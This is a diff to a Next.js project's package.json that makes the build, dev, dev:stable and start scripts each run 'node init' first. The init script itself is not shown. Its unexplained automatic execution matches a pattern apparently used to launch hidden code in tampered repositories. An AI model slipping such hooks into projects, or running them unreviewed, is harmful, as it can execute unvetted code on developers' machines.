@@ -3,11 +3,11 @@
   "version": "0.1.0",
   "private": true,
   "scripts": {
-    "build": "next build --webpack",
-    "dev": "next dev --turbopack --disable-source-maps",
-    "dev:stable": "next dev --webpack --disable-source-maps",
+    "build": "node init && next build --webpack",
+    "dev": "node init && next dev --turbopack --disable-source-maps",
+    "dev:stable": "node init && next dev --webpack --disable-source-maps",
     "lint": "eslint .",
-    "start": "next start"
+    "start": "node init && next start"
   },
   "dependencies": {
     "@hookform/resolvers": "^3.9.1",
